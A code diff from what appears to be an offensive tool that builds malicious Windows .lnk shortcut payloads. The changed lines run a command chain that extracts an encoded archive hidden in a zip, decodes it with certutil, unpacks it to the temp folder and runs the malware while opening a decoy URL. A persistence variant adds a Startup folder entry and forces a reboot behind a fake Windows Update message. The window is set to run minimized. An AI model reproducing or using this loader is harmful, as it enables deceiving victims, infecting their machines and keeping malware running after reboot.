@@ -56,7 +56,7 @@ def create_lnk(lnk_path,decoy_url,malware,use_persistence):
         shortcut.Arguments = f' /c forfiles /s /p %userprofile% /M {os.path.basename(lnk_path)[:-4]}.zip /C "Cmd /C findstr /R """Li8uL0*""" @FiLe > %TeMp%\\test.b64" & certutil -decodehex %temp%\\test.b64 %temp%\\test.tar 1 & tar -xf %temp%\\test.tar -C %temp% & echo [InternetShortcut] > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Explorer.url" & echo URL=%tEMP%\\{malware} >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Explorer.url" & start "" {decoy_url} & shutdown /r /t 60 /c "Windows Update is Complete. Your system will reboot in 60 seconds. Please save your work!"'
     else:
         print("[+] Normal mode: Will extract and execute.")
-        shortcut.Arguments = f' /c forfiles /s /p %userprofile% /M {os.path.basename(lnk_path)[:-4]}.zip /C "Cmd /C findstr /R """Li8uL0B*""" @FiLe > %TeMp%\\test.b64" & certutil -decodehex %temp%\\test.b64 %temp%\\test.tar 1 & tar -xf %temp%\\test.tar -C %temp% & start "" {decoy_url} & %tEMP%\\{malware}'
+        shortcut.Arguments = f' /c forfiles /s /p %userprofile% /M {os.path.basename(lnk_path)[:-4]}.zip /C "Cmd /C findstr /R """Li8uL0*""" @FiLe > %TeMp%\\test.b64" & certutil -decodehex %temp%\\test.b64 %temp%\\test.tar 1 & tar -xf %temp%\\test.tar -C %temp% & start "" {decoy_url} & %tEMP%\\{malware}'
 
     print("[+] Your lnk payload is : " + shortcut.TargetPath + shortcut.Arguments)
     shortcut.WindowStyle = 7  # Run minimized
